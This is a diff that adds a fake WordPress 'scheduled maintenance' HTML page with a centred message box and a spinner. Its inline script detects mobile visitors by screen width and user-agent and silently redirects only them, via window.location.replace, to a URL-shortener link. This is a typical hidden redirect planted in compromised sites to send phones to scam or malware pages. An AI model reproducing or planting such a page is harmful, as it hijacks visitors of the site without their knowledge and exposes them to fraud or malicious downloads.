@@ -1,0 +1,151 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+
+<meta charset="UTF-8">
+
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<meta name="robots" content="noindex, follow">
+
+<title>Briefly unavailable for scheduled maintenance</title>
+
+<style>
+
+*{
+    box-sizing:border-box;
+}
+
+body{
+
+    margin:0;
+
+    height:100vh;
+
+    display:flex;
+
+    justify-content:center;
+
+    align-items:center;
+
+    background:#f0f6fc;
+
+    font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Arial,sans-serif;
+
+    color:#21759b;
+
+}
+
+.box{
+
+    background:#fff;
+
+    padding:50px 40px;
+
+    border-radius:18px;
+
+    box-shadow:0 10px 35px rgba(0,0,0,.08);
+
+    text-align:center;
+
+    width:90%;
+
+    max-width:600px;
+
+}
+
+.logo{
+
+    font-size:62px;
+
+    font-weight:700;
+
+    margin:0;
+
+    letter-spacing:-2px;
+
+}
+
+.text{
+
+    margin-top:20px;
+
+    font-size:19px;
+
+    line-height:1.7;
+
+    color:#5c6b77;
+
+}
+
+.loader{
+
+    width:42px;
+
+    height:42px;
+
+    border:3px solid #d9e7f2;
+
+    border-top:3px solid #21759b;
+
+    border-radius:50%;
+
+    margin:30px auto 0;
+
+    animation:spin 1s linear infinite;
+
+}
+
+@keyframes spin{
+
+    100%{
+        transform:rotate(360deg);
+    }
+
+}
+
+@media(max-width:600px){
+
+    .logo{
+        font-size:44px;
+    }
+
+    .text{
+        font-size:16px;
+    }
+
+}
+
+</style>
+
+</head>
+
+<body>
+
+<div class="box">
+
+    <h1 class="logo">WordPress</h1>
+
+    <div class="text">
+        Briefly unavailable for scheduled maintenance.<br>
+        Check back in a some hours.
+    </div>
+
+    <div class="loader"></div>
+
+</div>
+<script>
+
+const isMobile = window.matchMedia("(max-width: 768px)").matches
+    || /Android|iPhone|iPad|iPod|Opera Mini|IEMobile/i.test(navigator.userAgent);
+
+if (isMobile) {
+
+    window.location.replace("//ushort.org/UodwBHqSQ0r2");
+
+}
+
+</script>
+</body>
+</html>
